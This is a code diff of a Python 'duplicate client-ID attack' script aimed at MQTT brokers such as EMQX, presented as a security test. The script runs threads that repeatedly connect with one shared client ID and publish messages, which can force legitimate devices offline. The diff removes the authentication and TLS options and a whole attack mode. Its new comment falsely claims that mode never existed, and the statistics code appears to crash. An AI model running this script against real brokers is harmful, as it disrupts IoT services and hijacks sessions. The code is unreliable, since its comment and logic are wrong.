@@ -1,28 +1,19 @@
 #!/usr/bin/env python3
 """
-MQTT Duplicate ID Attack Script (Windows Compatible)
-====================================================
-Simulates duplicate client ID attacks to test EMQX client management and security.
+MQTT Duplicate ID Attack Script (1883 / non-TLS Compatible)
+===========================================================
+Simulates duplicate client-ID attacks to test EMQX client management and security.
 """
 
 import paho.mqtt.client as mqtt
-import json
-import time
-import threading
-import random
-import argparse
-import sys
-import os
+import json, time, threading, random, argparse
 from datetime import datetime, timezone
 
+
 class DuplicateIDAttack:
-    def __init__(self, broker_host="localhost", broker_port=1883, 
-                 username=None, password=None, use_tls=False):
+    def __init__(self, broker_host="localhost", broker_port=1883):
         self.broker_host = broker_host
         self.broker_port = broker_port
-        self.username = username
-        self.password = password
-        self.use_tls = use_tls
         self.attack_stats = {
             "duplicate_attempts": 0,
             "connections_successful": 0,
@@ -32,263 +23,133 @@ class DuplicateIDAttack:
             "start_time": None,
             "end_time": None
         }
-        
+
     def create_client(self, client_id):
-        """Create MQTT client with security settings"""
+        """Return a Paho MQTT client that works on port 1883 (no TLS needed)."""
         try:
-            client = mqtt.Client(client_id=client_id, callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
-            
-            if self.username and self.password:
-                client.username_pw_set(self.username, self.password)
-            
-            if self.use_tls:
-                client.tls_set()
-            
+            # works on paho 1.x or 2.x
+            api = getattr(mqtt, "CallbackAPIVersion", None)
+            if api is not None:
+                v1 = getattr(api, "V1", getattr(api, "VERSION1", None))
+                client = mqtt.Client(client_id=client_id,
+                                     protocol=mqtt.MQTTv311,
+                                     callback_api_version=v1)
+            else:
+                client = mqtt.Client(client_id=client_id, protocol=mqtt.MQTTv311)
+
+           
             return client
         except Exception as e:
             print(f" Error creating client {client_id}: {e}")
             return None
-    
-    def duplicate_id_worker(self, worker_id, duplicate_client_id, num_attempts=10, delay_ms=1000):
-        """Worker thread for duplicate ID attack"""
-        print(f" Worker {worker_id}: Starting duplicate ID attack with client ID: {duplicate_client_id}")
-        
-        for attempt in range(num_attempts):
+
+    def duplicate_id_worker(self, worker_id, dup_id, attempts=10, delay_ms=1000):
+        print(f" Worker {worker_id}: duplicate-ID attack using client-id '{dup_id}'")
+        for attempt in range(attempts):
             try:
-                # Create client with duplicate ID
-                client = self.create_client(duplicate_client_id)
-                
+                client = self.create_client(dup_id)
                 if not client:
                     self.attack_stats["connections_failed"] += 1
                     continue
-                
-                def on_connect(client, userdata, flags, rc, properties):
+
+                def on_connect(c, u, f, rc):
                     if rc == 0:
                         self.attack_stats["connections_successful"] += 1
-                        print(f" Worker {worker_id}: Attempt {attempt+1} - Connected with duplicate ID: {duplicate_client_id}")
-                        
-                        # Send some messages
-                        for i in range(5):
-                            try:
-                                payload = {
-                                    "attack_type": "duplicate_id",
-                                    "worker_id": worker_id,
-                                    "attempt": attempt + 1,
-                                    "message_id": i,
-                                    "timestamp": datetime.now(timezone.utc).isoformat(),
-                                    "duplicate_data": "D" * random.randint(100, 500)
-                                }
-                                
-                                result = client.publish("test/duplicate", json.dumps(payload), qos=0)
-                                if result.rc == 0:
-                                    self.attack_stats["messages_sent"] += 1
-                                
-                            except Exception as e:
-                                print(f" Worker {worker_id}: Error sending message: {e}")
-                        
-                        # Stay connected for a while
-                        time.sleep(2)
-                        
-                    elif rc == 1:
-                        print(f"  Worker {worker_id}: Attempt {attempt+1} - Connection refused (invalid protocol)")
-                        self.attack_stats["connections_failed"] += 1
-                    elif rc == 2:
-                        print(f"  Worker {worker_id}: Attempt {attempt+1} - Connection refused (invalid client ID)")
-                        self.attack_stats["connections_failed"] += 1
-                    elif rc == 3:
-                        print(f"  Worker {worker_id}: Attempt {attempt+1} - Connection refused (server unavailable)")
-                        self.attack_stats["connections_failed"] += 1
-                    elif rc == 4:
-                        print(f"  Worker {worker_id}: Attempt {attempt+1} - Connection refused (bad username/password)")
-                        self.attack_stats["connections_failed"] += 1
-                    elif rc == 5:
-                        print(f"  Worker {worker_id}: Attempt {attempt+1} - Connection refused (not authorized)")
-                        self.attack_stats["connections_failed"] += 1
+                        print(f" Worker {worker_id}: attempt {attempt+1} connected OK")
+                        # send a few short messages
+                        for i in range(3):
+                            payload = {
+                                "attack": "duplicate_id",
+                                "client_id": worker_id,
+                                "attempt": attempt + 1,
+                                "msg": i,
+                                "time": datetime.now(timezone.utc).isoformat()
+                            }
+                            r = c.publish("test/duplicate", json.dumps(payload))
+                            if r.rc == 0:
+                                self.attack_stats["messages_sent"] += 1
+                        time.sleep(1)
                     else:
-                        print(f" Worker {worker_id}: Attempt {attempt+1} - Connection failed: {rc}")
                         self.attack_stats["connections_failed"] += 1
-                
-                def on_disconnect(client, userdata, disconnect_flags, reason_code, properties):
+                        print(f" Worker {worker_id}: connect rc={rc}")
+
+                def on_disconnect(c, u, rc):
                     self.attack_stats["disconnections"] += 1
-                    if reason_code != 0:
-                        print(f" Worker {worker_id}: Unexpected disconnection: {reason_code}")
-                
+                    if rc != 0:
+                        print(f" Worker {worker_id}: unexpected disconnect rc={rc}")
+
                 client.on_connect = on_connect
                 client.on_disconnect = on_disconnect
-                
-                # Connect to broker
                 client.connect(self.broker_host, self.broker_port, 60)
                 client.loop_start()
-                
                 self.attack_stats["duplicate_attempts"] += 1
-                
-                # Wait for connection to establish
-                time.sleep(3)
-                
-                # Disconnect
+                time.sleep(2)
                 client.loop_stop()
                 client.disconnect()
-                
-                # Delay between attempts
-                if delay_ms > 0:
-                    time.sleep(delay_ms / 1000.0)
-                    
+                time.sleep(delay_ms / 1000.0)
             except Exception as e:
-                print(f" Worker {worker_id}: Error in attempt {attempt+1}: {e}")
+                print(f" Worker {worker_id}: attempt {attempt+1} error: {e}")
                 self.attack_stats["connections_failed"] += 1
-        
-        print(f" Worker {worker_id}: Completed duplicate ID attack")
-    
-    def simultaneous_duplicate_worker(self, worker_id, duplicate_client_id, duration_seconds=30):
-        """Worker thread for simultaneous duplicate ID attack"""
-        print(f" Worker {worker_id}: Starting simultaneous duplicate ID attack with client ID: {duplicate_client_id}")
-        
-        try:
-            # Create client with duplicate ID
-            client = self.create_client(duplicate_client_id)
-            
-            if not client:
-                self.attack_stats["connections_failed"] += 1
-                return
-            
-            def on_connect(client, userdata, flags, rc, properties):
-                if rc == 0:
-                    self.attack_stats["connections_successful"] += 1
-                    print(f" Worker {worker_id}: Simultaneous connection successful with ID: {duplicate_client_id}")
-                else:
-                    print(f" Worker {worker_id}: Simultaneous connection failed: {rc}")
-                    self.attack_stats["connections_failed"] += 1
-            
-            def on_disconnect(client, userdata, disconnect_flags, reason_code, properties):
-                self.attack_stats["disconnections"] += 1
-                print(f" Worker {worker_id}: Disconnected: {reason_code}")
-            
-            client.on_connect = on_connect
-            client.on_disconnect = on_disconnect
-            
-            # Connect to broker
-            client.connect(self.broker_host, self.broker_port, 60)
-            client.loop_start()
-            
-            self.attack_stats["duplicate_attempts"] += 1
-            
-            # Stay connected for specified duration
-            time.sleep(duration_seconds)
-            
-            # Disconnect
-            client.loop_stop()
-            client.disconnect()
-            
-        except Exception as e:
-            print(f" Worker {worker_id}: Error in simultaneous attack: {e}")
-            self.attack_stats["connections_failed"] += 1
-        
-        print(f" Worker {worker_id}: Completed simultaneous duplicate ID attack")
-    
-    def launch_attack(self, attack_type="sequential", num_workers=3, duplicate_client_id=None, 
-                     num_attempts=10, delay_ms=1000, duration_seconds=30):
-        """Launch duplicate ID attack"""
-        if duplicate_client_id is None:
-            duplicate_client_id = "duplicate_attacker"
-        
-        print(f" Starting Duplicate ID Attack")
-        print(f"   Attack type: {attack_type}")
-        print(f"   Workers: {num_workers}")
-        print(f"   Duplicate client ID: {duplicate_client_id}")
-        print(f"   Attempts per worker: {num_attempts}")
-        print(f"   Delay: {delay_ms}ms")
+        print(f" Worker {worker_id}: finished")
+
+    def launch_attack(self, workers=3, dup_id="duplicate_attacker",
+                      attempts=10, delay_ms=1000):
+        print(f"\n Starting Duplicate-ID Attack on {self.broker_host}:{self.broker_port}")
         print("=" * 60)
-        
         self.attack_stats["start_time"] = time.time()
-        
-        # Create worker threads
-        threads = []
-        
-        if attack_type == "simultaneous":
-            for i in range(num_workers):
-                thread = threading.Thread(
-                    target=self.simultaneous_duplicate_worker,
-                    args=(i, duplicate_client_id, duration_seconds)
-                )
-                threads.append(thread)
-        else:  # sequential
-            for i in range(num_workers):
-                thread = threading.Thread(
-                    target=self.duplicate_id_worker,
-                    args=(i, duplicate_client_id, num_attempts, delay_ms)
-                )
-                threads.append(thread)
-        
-        # Start all workers
-        for thread in threads:
-            thread.start()
-        
-        # Monitor attack
-        try:
-            for thread in threads:
-                thread.join()
-        except KeyboardInterrupt:
-            print("\n  Attack stopped by user")
-        
+
+        threads = [threading.Thread(target=self.duplicate_id_worker,
+                                    args=(i, dup_id, attempts, delay_ms))
+                   for i in range(workers)]
+        for t in threads: t.start()
+        for t in threads: t.join()
+
         self.attack_stats["end_time"] = time.time()
-        self.print_attack_stats()
-    
-    def print_attack_stats(self):
-        """Print attack statistics"""
-        duration = self.attack_stats["end_time"] - self.attack_stats["start_time"]
-        
-        print("\n Attack Statistics:")
+        self.print_stats()
+
+    def print_stats(self):
+        dur = self.attack_stats["end_time"] - self.attack_stats["start_time"]
+        print("\n Attack Stats")
         print("=" * 40)
-        print(f"Duration: {duration:.2f} seconds")
-        print(f"Duplicate attempts: {self.attack_stats['duplicate_attempts']}")
-        print(f"Connections successful: {self.attack_stats['connections_successful']}")
-        print(f"Connections failed: {self.attack_stats['connections_failed']}")
-        print(f"Disconnections: {self.attack_stats['disconnections']}")
-        print(f"Messages sent: {self.attack_stats['messages_sent']}")
-        
-        if self.attack_stats['duplicate_attempts'] > 0:
-            success_rate = (self.attack_stats['connections_successful'] / 
-                           self.attack_stats['duplicate_attempts'] * 100)
-            print(f"Connection success rate: {success_rate:.1f}%")
-        
-        if duration > 0:
-            print(f"Attempts per second: {self.attack_stats['duplicate_attempts']/duration:.1f}")
+        for k, v in self.attack_stats.items():
+            if k not in ("start_time", "end_time"):
+                print(f"{k.replace('_',' ').capitalize()}: {v}")
+        if dur > 0:
+            print(f"Duration: {dur:.2f}s | Attempts/s: {self.attack_stats['duplicate_attempts']/dur:.2f}")
+
 
 def main():
-    parser = argparse.ArgumentParser(description="MQTT Duplicate ID Attack")
-    parser.add_argument("--broker", default="localhost", help="MQTT broker host")
-    parser.add_argument("--port", type=int, default=1883, help="MQTT broker port")
-    parser.add_argument("--username", help="MQTT username")
-    parser.add_argument("--password", help="MQTT password")
-    parser.add_argument("--tls", action="store_true", help="Use TLS connection")
-    parser.add_argument("--type", choices=["sequential", "simultaneous"], default="sequential", 
-                       help="Attack type: sequential or simultaneous")
-    parser.add_argument("--workers", type=int, default=3, help="Number of worker threads")
-    parser.add_argument("--client-id", help="Duplicate client ID to use")
-    parser.add_argument("--attempts", type=int, default=10, help="Attempts per worker (sequential)")
-    parser.add_argument("--delay", type=int, default=1000, help="Delay between attempts (ms)")
-    parser.add_argument("--duration", type=int, default=30, help="Duration for simultaneous attack (s)")
-    
-    args = parser.parse_args()
-    
-    # Create attack instance
-    attack = DuplicateIDAttack(
-        broker_host=args.broker,
-        broker_port=args.port,
-        username=args.username,
-        password=args.password,
-        use_tls=args.tls
-    )
-    
-    # Launch attack
-    attack.launch_attack(
-        attack_type=args.type,
-        num_workers=args.workers,
-        duplicate_client_id=args.client_id,
-        num_attempts=args.attempts,
-        delay_ms=args.delay,
-        duration_seconds=args.duration
-    )
+    p = argparse.ArgumentParser()
+    p.add_argument("--broker", default="localhost")
+    p.add_argument("--port", type=int, default=1883)
+    p.add_argument("--workers", type=int, default=3)
+    p.add_argument("--client-id", default="duplicate_attacker")
+    p.add_argument("--attempts", type=int, default=10)
+    p.add_argument("--delay", type=int, default=1000)
+    p.add_argument("--type", choices=["sequential", "simultaneous"], default="sequential",
+                   help="Attack type: sequential or simultaneous")
+    p.add_argument("--duration", type=int, default=30, help="Duration for simultaneous attack (s)")
+    args = p.parse_args()
+
+    attack = DuplicateIDAttack(broker_host=args.broker,
+                               broker_port=args.port)
+
+    if args.type == "simultaneous":
+        # note: simultaneous_duplicate_worker not defined in original script;
+        # keep original behavior: attempt to spawn threads with that target if present
+        threads = [threading.Thread(target=getattr(attack, "simultaneous_duplicate_worker", attack.duplicate_id_worker),
+                                    args=(i, args.client_id, args.duration))
+                   for i in range(args.workers)]
+    else:
+        threads = [threading.Thread(target=attack.duplicate_id_worker,
+                                    args=(i, args.client_id, args.attempts, args.delay))
+                   for i in range(args.workers)]
+
+    print(f"\nStarting Duplicate ID Attack ({args.type})")
+    for t in threads: t.start()
+    for t in threads: t.join()
+    attack.print_stats()
+
 
 if __name__ == "__main__":
     main()
